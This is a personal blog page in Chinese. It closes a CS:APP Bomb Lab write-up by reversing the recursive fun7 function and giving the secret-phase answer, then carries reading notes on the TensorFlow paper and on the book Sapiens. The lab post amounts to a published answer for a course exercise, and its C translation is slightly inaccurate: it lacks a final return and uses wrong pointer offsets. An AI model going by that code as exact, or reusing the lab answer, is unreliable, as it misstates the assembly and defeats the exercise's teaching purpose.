<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><code>fun7</code> 是一个递归函数，它的 C 语言版本为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// %rdi 为 &amp;x, %esi 为 y</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*x &lt; y) &#123;</span><br><span class="line">        ret = fun7(x + <span class="number">0x10</span>, y);</span><br><span class="line">        ret = ret * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*x == y) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = fun7(x + <span class="number">0x8</span>, y);</span><br><span class="line">        ret *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了让 <code>fun7</code> 返回 2，需要递归三层：</p>
<blockquote>
<p>2 = 2 * 1<br>1 = 2 * 0 + 1<br>0 = 0</p>
</blockquote>
<p>我们让 0x6030f0 + 0x08 + 0x10 = 0x603108，访问这个地址，我们得到 0x16（十进制为 22）。</p>
<p><img src="/images/2017-4-17/secret/su.png" alt="su"></p>
<p>终于，解决了隐藏关卡！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个实验耗费了我将近 4 天的时间，期间我无数次有过摔电脑的冲动。不过完成之后，我还是获得了慢慢的成就感，加深了对汇编语言的认识，也学习了 GDB 的使用方法。最关键的收获就是要自己冷静地分析和思考问题，相信自己可以做出来。</p>
<p>下一个 Lab，我来了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/03/27/tensorflow-learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/27/tensorflow-learning/" class="post-title-link" itemprop="url">TensorFlow 论文阅读笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-03-27 20:37:23" itemprop="dateCreated datePublished" datetime="2017-03-27T20:37:23+08:00">2017-03-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/booknotes/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/03/27/tensorflow-learning/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/27/tensorflow-learning/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近学习机器学习用到了 TensorFlow，所以找来了 Google Brain 团队发表的关于 TensorFlow 的<a href="https://arxiv.org/abs/1603.04467" target="_blank" rel="noopener">论文</a>学习，以下是一点笔记。</p>
<h2 id="TensorFlow-的起源"><a href="#TensorFlow-的起源" class="headerlink" title="TensorFlow 的起源"></a>TensorFlow 的起源</h2><p>Google 在成立 Google Brain  之后，为了内部研究和开发机器学习和深度神经网络的需要，开发了「DistBelief」，并且去得了很好得成果。在 「DistBelief」的基础上，Google Brain 团队对所期望的系统有了更深入的理解，在加上新的对机器学习系统在不同运算环境中运行的需求，Google Brain 开发了 TensorFlow。</p>
<h2 id="编程模型和基本概念"><a href="#编程模型和基本概念" class="headerlink" title="编程模型和基本概念"></a>编程模型和基本概念</h2><p> 一个 TensorFlow 的计算过程被描述为一个有向图（directed graph），这个有向图由许多<em>node</em> 组合而成。不同的 <em>node</em> 可能保存着持久化的状态，也可能用来实现分支或循环操作。</p>
<p>在一个 TensorFlow 的数据流图中，每个 <em>node</em> 有零个或多个输入，也有零个或多个输出，并代表某个操作（<em>operation<em>）的实例化过程。在数据流图中普通边上流动的值被称为 *tensor</em>，代表任意维度的数组。特殊的边被称为 <em>control dependencies</em>，这样的边上没有数据流动，只用来描述操作的依赖关系，用来后一个 *operation</em> 必须在前一个 <em>operation</em> 完成之后才能执行。</p>
<p>下面是用 Python 实现的一个简单的数据流图：</p>
<p><img src="/images/2017-3-26/fd5969dca256c079243624fda8c8e34e.jpeg" alt="fd5969dca256c079243624fda8c8e34e"></p>
<p>实现的数据流图为：</p>
<p><img src="/images/2017-3-26/60a1561cb2cb9d8d7564c182466def5f.jpeg" alt="60a1561cb2cb9d8d7564c182466def5f"></p>
<h3 id="Operations-and-Kernels"><a href="#Operations-and-Kernels" class="headerlink" title="Operations and Kernels"></a>Operations and Kernels</h3><p>一个 <em>operation</em> 拥有一个名字，并且对一个计算进行抽象（比如矩阵乘法和加法）。一个 <em>operation</em> 也有很多属性（attributes），所有的属性必须在数据流图被构建的时候被提供或被推断，从而使得 TensorFlow 可以实例化一个 <em>node</em> 来执行这个 <em>operation</em>。</p>
<p>一个 <em>kernel</em> 是对一种可以运行在专门硬件（如：CPU或 GPU）上的 <em>operation</em> 的实现。TensorFlow 使用一种注册机制来维护 <em>operation</em> 和 <em>kernel</em> 的集合，用户可以通过链接新的 <em>operation</em> 或 注册新的 <em>kernel</em> 在对 TensorFlow 进行拓展。</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>用户通过创建一个 <em>Session</em> 来和 TensorFlow 交互。可以使用 <em>Session</em> 接口的 <em>Extend</em> 在对现有的数据流图进行拓展。<em>Session</em> 支持的另一个主要的操作是 <em>Run*，它接受需要被计算的变量，和提供给数据流图的必要的数据来完成计算。调用 *Run</em> 后，TensorFlow 会自动按照所定义的数据流图，并在遵守依赖关系的前提下完成计算。</p>
<h3 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h3><p>通常，一个数据流图会被计算多次，大多数的 <em>tensor</em> 在数据流图的一次执行后就会消失。而一个 <em>Variable</em> 是一种特殊的 <em>operation*，它可以返回一个指向在运算过程中持续存在的 *tensor</em> 的引。这些引用可以被传递给其他操作来对 <em>tensor</em> 进行修改。在机器学习任务中，通常使用 <em>Variable</em> 来保存参数，并在数据流图的运算过程中不断更新。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>在一个 TensorFlow 系统中，用户通过 <em>Session</em> 和 TensorFlow 的 <em>master</em> 进程交互，<em>master</em> 进程将任务分配给不同的 <em>worker</em> 进程，而每个 <em>worker</em> 进程负责在一个或多个设备上执行运算。</p>
<p>TensorFlow 有「本地」和「分布式」的实现版本，其中「本地」的实现表示所有的运算都在同一个操作系统的进程中执行（该操作系统可能拥有多个 CPU 或 GPU）；而「分布式」的实现支持有多台主机的多个进程共同完成计算任务。</p>
<p><img src="/images/2017-3-26/cf4177411902a63dc43231742cae16d7.jpeg" alt="cf4177411902a63dc43231742cae16d7"></p>
<p>在 TensorFlow 中设备以及设备的名字和计算进程都会被合理的管理，用户可以通过注册的方法添加新的设备。</p>
<p>Tensor 在实现中是一个强类型的多维数组，Tensor 可以保存 从 8 bits 到 64 bits 的有/无符号整数、单/多精度的浮点数、复数和字符串类型。TensorFlow 使用引用计数来管理内存，当某个实例没有指向它的引用时，这个实例会自动被销毁。</p>
<h3 id="TensorFlow-在单个设备上执行"><a href="#TensorFlow-在单个设备上执行" class="headerlink" title="TensorFlow 在单个设备上执行"></a>TensorFlow 在单个设备上执行</h3><p>TensorFlow 的最简单的执行模型是：一个 <em>worker</em> 进程在一个设备上进行计算。数据流图中 <em>node</em> 按照定义的相互依赖关系执行。TensorFlow 会保存每个 <em>node</em> 所依赖的，并且没有执行完毕的 <em>node</em> 的个数，当所有依赖的 <em>node</em> 执行完毕之后，该 <em>node</em> 会被加入一个「就绪队列」中，在这个队列中的 <em>node</em> 的执行顺序是<strong>不确定</strong>的。</p>
<h3 id="TensorFlow-在多个设备上执行"><a href="#TensorFlow-在多个设备上执行" class="headerlink" title="TensorFlow 在多个设备上执行"></a>TensorFlow 在多个设备上执行</h3><p>对于拥有多个运算设备的系统，TensorFlow 需要解决两个难题：</p>
<ol>
<li>决定在哪个设备上执行某个 <em>node</em> 的计算任务</li>
<li>管理设备间的数据交流</li>
</ol>
<h4 id="node-计算任务的分配"><a href="#node-计算任务的分配" class="headerlink" title="node 计算任务的分配"></a><em>node</em> 计算任务的分配</h4><p>对于一个给定的数据流图，TensorFlow 会使用设备分配算法（placement algorithm）负责将计算任务映射到可用的设备上。设备分配分配算法需要将成本模型（cost model）作为参数，它包含了每个 <em>node</em> 中计算操作的输入和输入张量的大小（以字节为单位）和该 <em>node</em> 估计的计算时间。</p>
<p>设备分配算法模拟数据流图的计算过程并使用贪心策略（greedy heuristic）来为每个 <em>node</em> 分配运算设备。</p>
<p>设备分配算法首先从数据流图的源头开始对每个 <em>node</em> 的计算过程进行模拟。当某个 <em>node</em> 需要计算资源时，设备分配算法会将运行该计算的预计时间最短的<strong>可用</strong>设备分配给该节点。对于需要多个计算设备的 <em>node</em>，分配算法会使用贪心策略考虑将计算分配到不同设备后所需要的计算时间，并会考虑设备间数据通信的成本。总之，分配算法会将<strong>执行某计算操作最快的可用设备</strong>分配给 <em>node</em>。</p>
<h4 id="设备间的通信"><a href="#设备间的通信" class="headerlink" title="设备间的通信"></a>设备间的通信</h4><p>当设备分配算法结束时，数据流图会被划分为多个子图，每个子图对应一个计算设备。位于不同运算设备的任务 <em>x</em> 和 <em>y</em> 之间的通讯被新建的 <em>Send</em> 和 <em>Receive</em> <em>node</em>所接管。</p>
<p><img src="/images/2017-3-26/c675f1318f113e51f6a52f987227db8c.jpeg" alt="c675f1318f113e51f6a52f987227db8"></p>
<p>插入 <em>Receive</em> 和 <em>Send</em> 节点后，TensorFlow 使依赖于特定张量的操作使用同一个 <em>Receive node</em>，而不是每个操作都拥有一个 <em>Receive node</em>，这样可以避免不必要的内存分配，并可以解决数据同步问题。</p>
<p>这样处理设备通讯的方法可以使得管理分配在不同设备上的 <em>node</em> 实现去中心化。因为 <em>Send</em> 和 <em>Receive</em> <em>nodes</em> 解决了数据同步问题，所以 <em>master</em> 进程仅仅需要对每个 <em>worker</em> 进程发出运行指令，而不需要管理位于不同运算设备上计算任务之间的通信。</p>
<h3 id="TensorFlow-在分布式系统上执行"><a href="#TensorFlow-在分布式系统上执行" class="headerlink" title="TensorFlow 在分布式系统上执行"></a>TensorFlow 在分布式系统上执行</h3><p>TensorFlow 在分布式系统上的执行和在多个设备上的执行方式类似，在设备分配算法运行完后，每个子数据流图被分配到某个设备上，<em>Send</em> 和 <em>Receive</em> <em>node</em> 使用远程连接协议，比如：TCP 和 RDMA，在不同系统间传输数据。</p>
<h4 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h4><p>在分布式系统的运行过程中，错误可能在许多地方被检测到。TensorFlow 主要依赖于：</p>
<ol>
<li>在 <em>Send</em> 和 <em>Receive</em> 之间的通信错误</li>
<li><em>master</em> 进程对每个 <em>worker</em> 进程的周期性检查</li>
</ol>
<p>当某个错误被检测到时，整个数据流图的计算将被中断并且从头开始。注意，因为 <em>Variable</em> 保存在计算过程中持续存在的张量，所以 TensorFlow 将每个 <em>Variable</em> 与一个 <em>Save</em> 节点连接，<em>Save</em> 节点会定义保存 <em>Variable</em> 的状态。当错误发生时，TensorFlow 可以从 <em>Save</em> 保存的最近的状态恢复。</p>
<h2 id="TensorFlow-的高级特性"><a href="#TensorFlow-的高级特性" class="headerlink" title="TensorFlow 的高级特性"></a>TensorFlow 的高级特性</h2><h3 id="梯度计算（Gradient-Computation）"><a href="#梯度计算（Gradient-Computation）" class="headerlink" title="梯度计算（Gradient Computation）"></a>梯度计算（Gradient Computation）</h3><p>许多优化和机器学习算法，如随机梯度下降（stochastic gradient descent），需要计算损失函数对某些输入的梯度。TensorFlow 有内置的对自动计算梯度的支持。如果 TensorFlow 中的一个 tensor $C$ 依赖于集合 ${X_k}$ 中的 tensor，那么内置的函数可以自动返回 ${dC/dX_k}$ 。</p>
<p>当 TensorFlow 需要计算 tensor $C$ 对 tensor $I$ 的梯度时，它首先找到从 $I$ 到 $C$ 的计算路径，之后，从 $C$ 反向回溯到 $I$，对于反向路径上的每个节点，TensorFlow 都会添加一个节点，并根据前向操作使用求导的「链式法则」得到「梯度计算函数」。每个「梯度计算函数」可能被注册到任意操作，它会将偏导数和前向计算过程的输出作为输入。特别的，对于操作 $O$ 如果损失函数 $C$ 仅仅依赖于输出中的 $y_1$ 而不依赖于 $y_2$，那么 $d_C/d_{y_1}=0$。</p>
<p>添加梯度计算节点会影响 TensorFlow 的优化能力，尤其是对内存使用的优化。开发团队也正在努力优化 TensorFlow 的内存管理策略。</p>
<h3 id="数据流图的部分执行（Partial-Execution）"><a href="#数据流图的部分执行（Partial-Execution）" class="headerlink" title="数据流图的部分执行（Partial Execution）"></a>数据流图的部分执行（Partial Execution）</h3><p>TensorFlow 支持部分子图的运行。当用户将整个数据流图构建完毕之后，可以调用 Run 方法来确定要运行的任意子图，并且可以向数据流图的任意边输入数据，或从任意边读取数据。数据流图中的每个节点都有一个名字，该节点的每个输出都由节点名和输出端口确定，如 <em>bar:0</em> 表示 <em>bar</em> 节点的第一个输出。Run 方法的两个参数就可以确定唯一的子图。</p>
<p>当计算一个子图时，会在为子图创建一个 <strong>feed</strong> 节点作为输入，<strong>fetch</strong> 节点用来接收输出。</p>
<p><img src="/images/2017-3-26/Screen%20Shot%202017-03-21%20at%2018.17.17.png" alt="Screen Shot 2017-03-21 at 18.17.17"></p>
<h3 id="设备限制（Device-Constraints）"><a href="#设备限制（Device-Constraints）" class="headerlink" title="设备限制（Device Constraints）"></a>设备限制（Device Constraints）</h3><p>TensorFlow 的用户可以通过对 <em>nodes</em> 添加对计算设备的限制来控制 <em>nodes</em> 的运算设备分配。用户可以设置某 <em>node</em> 仅可以在 GPU 上运算，或仅可以在设备的某进程中计算。</p>
<h3 id="控制流（Control-Flow）"><a href="#控制流（Control-Flow）" class="headerlink" title="控制流（Control Flow）"></a>控制流（Control Flow）</h3><p>虽然没有任何明确控制流的数据流图的表达能力很强，但是支持了条件语句和循环可以产生更加简洁也更加高效的机器学习算法。</p>
<p>TensorFlow 中添加了一些基本的控制流操作，可以处理环状的数据流图。<em>switch</em> 和 <em>merge</em> 操作使我们可以跳过整个子图的执行；<em>enter<em>，</em>leave</em> 和 <em>nextIteration</em> 操作使我们可以表达迭代。更高阶的 <em>if</em> 和 <em>while</em> 语句可以使用这些基本的原语来实现。</p>
<p>TensorFlow 实现了 <em>tags</em> 和 <em>frames</em> 标记，循环中的每一次迭代都被赋予唯一的 <em>tag*，循环的执行状态用 *frame</em> 来分割。一个可用的输入可以再任意时候进入迭代，这样，多次可以被并行执行。</p>
<p>TensorFlow 使用分布式定位技术（Distributed Coordination Mechanism）来执行带有控制流的数据流图。一般来说，一个循环可能包含被分贝在多个运算设备的 <em>node</em>。所以，管理循环的状态就变成了一个分布式的终止探测问题。TensorFlow 通过使用图重写（graph rewriting）来解决这个问题。在数据流图分割过程中，TensorFlow 会在每个子图中添加控制节点。这些节点实现了一个状态机，可以检测每次迭代的开始和结束，并决定是否终止循环。</p>
<p>我们常常使用梯度下降来训练机器学习模型，并且将梯度的计算过程作为数据流图的一部分。当一个模型包含了控制流时，我们必须判断控制流分支的方向，再计算梯度；同样的，当一个模型拥有一个 <em>while</em> 循环时，我们需要依赖于循环的中间值来进行计算。TensorFlow 尝试重写子图来保存计算梯度所需要的信息。</p>
<h3 id="输入操作（Input-Operations）"><a href="#输入操作（Input-Operations）" class="headerlink" title="输入操作（Input Operations）"></a>输入操作（Input Operations）</h3><p>TensorFlow 处理支持通过使用 <em>feed node</em> 来为计算提供数据外，也支持添加用于输入数据的 <em>input node</em>，它们使用文件名来配置，并可以每次执行时产生包含了一个或多个存储来文件中的数据的 <em>tensor</em>。</p>
<h3 id="队列（Queues）"><a href="#队列（Queues）" class="headerlink" title="队列（Queues）"></a>队列（Queues）</h3><p>TensorFlow 中的队列允许数据流图中的不同部分异步地执行，并且通过 <em>enqueue</em> 和 <em>dequeue</em> 要求或提供数据。<em>enqueue</em> 可以将队列阻塞，直到有足够的可用空间，之后将数据放入队列；<em>dequeue</em> 将队列阻塞直到队列中有足够的可用元素。队列使得 TensorFlow 可以实现并行计算，当上一组数据仍在被用于计算时，下一组数据可直接被取出用于计算。</p>
<p>除了 FIFO 队列外，TensorFlow 还实现了 <em>Shuffling Queue*，它可以随机地“打乱”队列中的元素，并输出其中一组。这样的队列对于需要 *shuffling</em> 功能的机器学习算法十分关键。</p>
<h3 id="容器（Container）"><a href="#容器（Container）" class="headerlink" title="容器（Container）"></a>容器（Container）</h3><p>容器用于管理长期存在的可变状态。一个 <em>Variable</em> 被存储在一个容器内，默认的容器知道进程结束后才会被销毁。通过使用容器，可以实现在与多个不同 <em>session</em> 想关联的数据流图之间共享状态。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>TensorFlow 中做了许多重要的性能优化，主要有：</p>
<ol>
<li>Common Subexpression Elimination。TensorFlow 可以删除多余的计算操作，如同一个计算操作的多个具有相同输入输出的拷贝。</li>
<li>Controlling Data Communication and Memory Usage。TensorFlow 通过规划计算操作的执行对系统的性能实现了优化，尤其是在数据转移和内存占用方面。</li>
<li>Asynchronous Kernels。TensorFlow 拥有非阻塞的内核，该内核函数被传入一个计算任务，在之前的计算任务结束后，被传入的任务继续执行。</li>
<li>Optimized Libraries for Kernel Implementations。TensorFlow 使用高度优化的数学运算库来实现操作。</li>
<li>Lossy Compression。当在不同设备间传输数据时，TensorFlow 使用 <em>lossy compression</em> 来压缩高精度数据，从而加快传输效率。</li>
</ol>
<p>TensorFlow 是 Google 在自己真实的人工智能经验上孵化出来的项目，非常值得我们学习。我觉得除了在学习工具外，对理论知识的学习才是重中之重，否则，即使进入了人工智能领域，码农也依然智能做搬砖的活儿。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/03/16/brief-history-of-humankind/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/16/brief-history-of-humankind/" class="post-title-link" itemprop="url">【人类简史】读书笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-03-16 20:43:07" itemprop="dateCreated datePublished" datetime="2017-03-16T20:43:07+08:00">2017-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/booknotes/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/03/16/brief-history-of-humankind/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/16/brief-history-of-humankind/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在历史的路上，有三大重要革命：大约7万年前，「认知革命」让历史正式启动；大约12000年前，「农业革命」让历史加速发展；而到了大约不过500年前，「科学革命」可以说让历史画下句点而另创新局。</p>
<h2 id="认知革命"><a href="#认知革命" class="headerlink" title="认知革命"></a>认知革命</h2><p>「认知革命」就是在大约7万到3万年前，出现了新的思维和沟通方式。</p>
<p>「认知革命」是历史从生物学中脱离而独立存在的起点。在这之前，所有人类行为都只称得上是生物学的范畴。</p>
<p>「思考」和「语言」是区分人和动物最根本的区别。人类语言真正独特的功能，并不在于能够传达关于人或狮子的信息，而在于能够传达关于一些根本不存在的事物的信息。就算是大批互不相识的人，只要同样相信某个故事，就能共同合作。</p>
<p>无论是现代国家、中世纪的教堂、古老的城市，或者古老的部落，任何大规模人类活动的根基，都在于某种只存在于集体想象中的故事。</p>
<p>除了存在于人类共同的想象外，这个宇宙根本没有神、没有国家、没有钱、没有人权、没有法律，也没有正义。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>新能力</th>
<th>更深远的影响</th>
</tr>
</thead>
<tbody><tr>
<td>河边有只狮子</td>
<td>能够传达更大量关于智人身边环境的信息</td>
<td>规划并执行复杂的计划</td>
</tr>
<tr>
<td>八卦</td>
<td>能够传达更大量关于智人社会关系的信息</td>
<td>组织更大，更有凝聚力的团体</td>
</tr>
<tr>
<td>虚构故事</td>
<td>能够传达关于虚构概念的信息，例如守护神、国家、人权</td>
<td>大量陌生人间的合作；社会行为的快速创新</td>
</tr>
</tbody></table>
<p>人类和黑猩猩之间真正不同的地方就在于那些虚构的故事，它像胶水一样把千千万万的个人、家庭和群体结合在一起。这种胶水，让我们成了万物的主宰。</p>
<p>认知革命之后生物学和历史的关系，我们可以简单整理成三点：</p>
<ol>
<li>基本上，生物学为智人的行为和能力设下了基本限制，像是定出了一个活动范围，而所有的历史都在这个范围内发生。</li>
<li>然而，这个范围非常大，让智人有各种惊人的发挥空间。因为他们有创造虚构故事的能力，就能创造出更多，更复杂的游戏，代代相传也就不断发展精进。</li>
<li>因此，想了解智人的行为，就必须描述人类行为的历史演化。</li>
</ol>
<p>语言和文化正是认知革命的主要成就。而正因为虚构故事已经出现，即使是在类似的生态、同样的基因组成下的人类，也能创造出非常不同的想象现实，表现出来就成了不同的规范和价值观。</p>
<p>整个动物界从古至今，最重要也最具有破坏性的力量，就是这群四处游荡、讲着故事的智人。</p>
<h2 id="农业革命"><a href="#农业革命" class="headerlink" title="农业革命"></a>农业革命</h2><p>农业革命的本质：让更多的人却以更糟的状况活下去。</p>
<p>人到现代还有着远古狩猎采集者的心，以及远古农民的胃。</p>
<p>农业革命所带来的非但不是轻松生活的新时代，反而让农民过着比采集者更幸苦、更不满足的生活。</p>
<p>种种想让生活变得轻松的努力，反而给人带来无穷的麻烦；而且这可不是史上最后一次。</p>
<p>我们从农业革命能学到的最重要一课，很可能就是物种演化上的成功并不代表个体的幸福。</p>
<p> 在农业革命之后，「未来」的重要性被提到史上新高。农民不仅时时刻刻都得想着未来，还几乎说是为了未来在服务。</p>
<p> 正是这些征收来的多余食粮，养活了政治、战争、艺术和哲学，建起了宫殿、堡垒、纪念碑和庙宇。在现代晚期之前，总人口有九成以上都是农民，日出而作，胼手胝足。他们生产出来的多余食粮养活了一小撮精英分子：国王、官员、战士、牧师、艺术家和思想家，但历史写的几乎全是这些人的故事。于是历史只告诉我们极少数的人在做些什么，而其他绝大多数人的生活就是不停挑水耕田。</p>
<p> 不管是汉谟拉比还是美国的开国元勋，心中都有个想象的现实，想象着这个世界有着放诸四海而皆准、永恒不变的正义原则。但这种不变的原则其实只存在于他们创造并告诉彼此的虚构故事中。这些原则，从来就没有客观的正确性。</p>
<p> 我们相信某种秩序，并非因为它是客观的现实，而是因为相信它可以让人提升合作效率、打造更美好的社会。</p>
<p> 身为人类，我们不可能脱离想象所构建出的秩序。每一次我们以为自己打破了监狱的高墙、迈向自由的前方，其实只是到了另一间更大的监狱，把活动范围稍稍加以扩大。</p>
<p> 然而历史的铁则告诉我们，每一种由想象构建出来的秩序，都绝不会承认自己出于想象和虚构，而会大谈自己是自然、必然的结果。</p>
<h2 id="人类的融合统一"><a href="#人类的融合统一" class="headerlink" title="人类的融合统一"></a>人类的融合统一</h2><p>农业革命之后，人类社会规模变得更大、更复杂，而维系社会秩序的虚构故事也更为细致完整。</p>
<p>文化一直想弭平这些矛盾，因此就会促成改变。</p>
<p>想要确保「平等」，就得限制住那些较突出的人；而想要人人都能「自由」，也就必然影响所有人的平等。</p>
<p>像这样的矛盾，本来就是每个人类无法避免的，甚至还可以说是文化引擎，为人类带来创意、提供动力。就像两个不谐和音可以让音乐往前进，人类的不同想法、概念和价值观也能逼着我们思考、批评、重新评价。一切要求一致，反而让心灵呆滞。</p>
<h3 id="金钱"><a href="#金钱" class="headerlink" title="金钱"></a>金钱</h3><p>因为有了金钱的概念，财富的交换、存储和运送都变得更容易也更便宜，后来才能发展出复杂的商业网络以及蓬勃的市场经济。要是没有钱，市场和商业网络的规模、活力和复杂程度都必然相当有限。</p>
<p>金钱并不是物质上的现实，而只是心理上的想象。金钱是有史以来最普遍也最有效的互信系统。</p>
<p>如果一切都能换成金钱，而大家相信的又都是不具名的硬币和贝壳，就可能伤害当地传统、亲密关系和人的价值，让冷酷无情的供需法则取而代之。</p>
